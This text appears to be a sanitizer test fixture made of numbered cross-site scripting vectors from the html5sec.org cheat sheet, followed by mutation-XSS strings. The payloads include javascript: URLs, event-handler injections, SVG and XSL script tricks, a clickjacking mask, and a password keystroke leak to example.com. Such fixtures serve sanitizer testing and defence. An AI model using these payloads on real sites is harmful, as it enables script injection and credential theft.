<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'\`-->]]>]</div>

<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'\`-->]]>]</div>

<div id="71"><// style=x:expression8alert(71)9>//["'\`-->]]>]</div>

<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'\`-->]]>]</div>

<div id="73"><event-source src="event.php" onload="alert(73)">//["'\`-->]]>]</div>

<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'\`-->]]>]</div>

<div id="75"><script<{alert(75)}/></script </>//["'\`-->]]>]</div>

<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'\`-->]]>]</div>

<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'\`-->]]>]</div>

<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'\`-->]]>]</div>

<div id="79"><object allowscriptaccess="always" data="x"></object>//["'\`-->]]>]</div>

<div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'\`-->]]>]</div>

<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'\`-->]]>]</div>

<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'\`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'\`-->]]>]</div>

<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'\`-->]]>]</div>

<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'\`-->]]>]</div>

<div id="86"><body oninput=alert(86)><input autofocus>//["'\`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
</svg>//["'\`-->]]>]</div>

<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
<set attributeName="onmouseover" to="alert(89)"/>
<animate attributeName="onunload" to="alert(89)"/>
</svg>//["'\`-->]]>]</div>

<div id="90"><!-- Up to Opera 10.63 -->
<div style=content:url(test2.svg)></div>

<!-- Up to Opera 11.64 - see link below -->

<!-- Up to Opera 12.x -->
<div style="background:url(test5.svg)">PRESS ENTER</div>//["'\`-->]]>]</div>

<div id="91">[A]
<? foo="><script>alert(91)</script>">
<! foo="><script>alert(91)</script>">
</ foo="><script>alert(91)</script>">
[B]
<? foo="><x foo='?><script>alert(91)</script>'>">
[C]
<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
[D]
<% foo><x foo="%><script>alert(91)</script>">//["'\`-->]]>]</div>

<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'\`-->]]>]</div>

<div id="93"><div style="list-style:url(http://foo.f)url(javascript:alert(93));">X</div>//["'\`-->]]>]</div>

<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
</svg>//["'\`-->]]>]</div>

<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<feImage>
<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
</feImage>
</svg>//["'\`-->]]>]</div>

<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'\`-->]]>]</div>

<div id="97"><!-- IE 5-9 -->
<div id=d><x xmlns="><iframe onload=alert(97)"></div>
<script>d.innerHTML+='';</script>
<!-- IE 10 in IE5-9 Standards mode -->
<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
<script>d.innerHTML+='';</script>//["'\`-->]]>]</div>

<div id="98"><div id=d><div style="font-family:'sansFAAFB colorAredB'">X</div></div>
<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'\`-->]]>]</div>

<div id="99">XXX<style>

*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */

<!--
--><!--*{color:red}   /* all UA */

*{background:url(xx //**/
ed/*)} /* IE 6-7 Standards mode */

</style>//["'\`-->]]>]</div>

<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(100)">//["'\`-->]]>]</div>

<div id="101"><a href="[a]java[b]script[c]:alert(101)">XXX</a>//["'\`-->]]>]</div>

<div id="102"><img src="x\` \`<script>alert(102)</script>"\` \`>//["'\`-->]]>]</div>

<div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'\`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
</svg>//["'\`-->]]>]</div>

<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'\`-->]]>]</div>

<div id="106"><img src onerror /" '"= alt=alert(106)//">//["'\`-->]]>]</div>

<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'\`-->]]>]</div>

<div id="108"><!-- IE 5-8 standards mode -->
<a href=http://foo.bar/#x=\`y></a><img alt="\`><img src=xx onerror=alert(108)></a>">
<!-- IE 5-9 standards mode -->
<!a foo=x=\`y><img alt="\`><img src=xx onerror=alert(2)//">
<?a foo=x=\`y><img alt="\`><img src=xx onerror=alert(3)//">//["'\`-->]]>]</div>

<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
<a id="x"><rect fill="white" width="1000" height="1000"/></a>
<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
</svg>//["'\`-->]]>]</div>

<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
</svg>//["'\`-->]]>]</div>

<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'\`-->]]>]</div>

<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'\`-->]]>]</div><div id="113"><div id="x">XXX</div>
<style>

#x{font-family:foo[bar;color:green;}

#y];color:red;{}

</style>//["'\`-->]]>]</div>

<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'\`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->
<!--[if<img src=x onerror=alert(2)//]> -->//["'\`-->]]>]</div>

<div id="116"><div id="x">x</div>
<xml:namespace prefix="t">
<import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" targetElement="x" to="<imgsrc=xonerror=alert(116)>">//["'\`-->]]>]</div>

<div id="117"><a href="http://attacker.org">
    <iframe src="http://example.org/"></iframe>
</a>//["'\`-->]]>]</div>

<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
    <h1>Drop me</h1>
</div>
<iframe src="http://www.example.org/dropHere.html"></iframe>//["'\`-->]]>]</div>

<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>

<textarea type="text" cols="50" rows="10"></textarea>//["'\`-->]]>]</div>

<div id="120"><script>
function makePopups(){
    for (i=1;i<6;i++) {
        window.open('popup.html','spam'+i,'width=50,height=50');
    }
}
</script>
<body>
<a href="#" onclick="makePopups()">Spam</a>//["'\`-->]]>]</div>

<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
xmlns:svg="http://www.w3.org/2000/svg">
<body style="background:gray">
<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
<svg:svg>
<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
</svg:mask>
</svg:svg>
</body>
</html>//["'\`-->]]>]</div>

<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'\`-->]]>]</div>

<div id="123"><span class=foo>Some text</span>
<a class=bar href="http://www.example.org">www.example.org</a>
<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
<script>
$("span.foo").click(function() {
alert('foo');
$("a.bar").click();
});
$("a.bar").click(function() {
alert('bar');
location="http://html5sec.org";
});
</script>//["'\`-->]]>]</div>

<div id="124"><script src="/example.comoo.js"></script> // Safari 5.0, Chrome 9, 10
<script src="\example.comoo.js"></script> // Safari 5.0//["'\`-->]]>]</div>

<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["'\`-->]]>]</div>

<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'\`-->]]>]</div>

<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
<handler id="y">alert(127)</handler>
</svg>//["'\`-->]]>]</div>

<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["'\`-->]]>]</div>

<div id="129"><svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
<!--
Same effect with
<image filter='...'>
-->
</svg>//["'\`-->]]>]</div>

<div id="130"><math href="javascript:alert(130)">CLICKME</math>
<math>
<!-- up to FF 13 -->
<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>

<!-- FF 14+ -->
<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
</math>//["'\`-->]]>]</div>

<div id="132"><!doctype html>
<form>
<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
<br>
<input name="secret" type="password">
</form>
<!-- injection --><svg height="50px">
<image xmlns:xlink="http://www.w3.org/1999/xlink">
<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
</image>
</svg>//["'\`-->]]>]</div>

<div id="133"><!-- \`<img/src=xxx onerror=alert(133)//--!>//["'\`-->]]>]</div>

<div id="134"><xmp>
<%
</xmp>
<img alt='%></xmp><img src=xx onerror=alert(134)//'>

<script>
x='<%'
</script> %>/
alert(2)
</script>

XXX
<style>
*['<!--']{}
</style>
-->{}
*{color:red}</style>//["'\`-->]]>]</div>

<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
<template match="/">
<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>
<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
</template>
</stylesheet>//["'\`-->]]>]</div>

<div id="136"><form action="x" method="post">
<input name="username" value="admin" />
<input name="password" type="password" value="secret" />
<input name="injected" value="injected" dirname="password" />
<input type="submit">
</form>//["'\`-->]]>]</div>

<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
</a>//["'\`-->]]>]</div>

<img name="bar" id="foo">

<input name=submit>123

<input name=acceptCharset>123

<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">

<div &nbsp;=""></div>

<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&gt;

<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>

<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>

<svg></p><title><template><style></title><img src=x onerror=alert(1)>

<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>

<form><input name=namespaceURI>

<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>

<svg></p><style><g title="</style><img src=x onerror=alert(1)>">

<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>

<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>

<xmp><svg><b><style><b title='</style><img>'>

<noembed><svg><b><style><b title='</style><img>'>

`;
